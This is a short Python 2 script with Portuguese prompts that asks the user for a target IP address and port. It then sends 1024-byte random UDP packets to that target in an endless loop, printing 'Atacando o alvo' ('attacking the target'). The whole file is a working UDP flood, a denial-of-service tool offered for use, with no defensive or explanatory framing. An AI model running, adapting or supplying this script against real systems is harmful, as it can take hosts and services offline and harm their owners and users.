import socket
import random

dest_ip = raw_input('Qual o alvo?\n ')
dest_port = int(raw_input('Qual a porta do alvo?\n '))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

pacote = random._urandom(1024)

print '\n\n Atacando o alvo'
while True:
    sock.sendto(pacote, (dest_ip, dest_port))


